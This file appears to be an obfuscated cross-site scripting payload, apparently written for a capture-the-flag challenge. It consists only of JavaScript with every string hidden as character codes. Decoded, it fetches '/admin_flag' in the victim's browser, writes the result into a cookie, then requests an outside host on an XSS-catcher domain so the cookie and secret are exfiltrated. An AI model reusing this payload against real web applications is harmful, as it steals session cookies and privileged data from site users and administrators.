var xhr = new XMLHttpRequest();
xhr.open(String.fromCharCode(71,69,84), String.fromCharCode(47,97,100,109,105,110,95,102,108,97,103), true);


xhr.onload = function () {
    if (xhr.readyState === xhr.DONE) {
        if (xhr.status === 200) {
            document.cookie = String.fromCharCode(102,108,97,103,61)+xhr.responseText;
            console.log(document.cookie);
            console.log(xhr.response);
            console.log(xhr.responseText);
        }
    }
};

xhr.send(null);

var xhr2 = new XMLHttpRequest();
xhr2.open(String.fromCharCode(71,69,84), String.fromCharCode(104,116,116,112,115,58,47,47,112,48,116,97,116,48,46,120,115,115,46,104,116), true);


xhr2.onload = function () {
    if (xhr.readyState === xhr.DONE) {
        if (xhr.status === 200) {
            console.log(document.cookie);
        }
    }
};

xhr2.send(null);
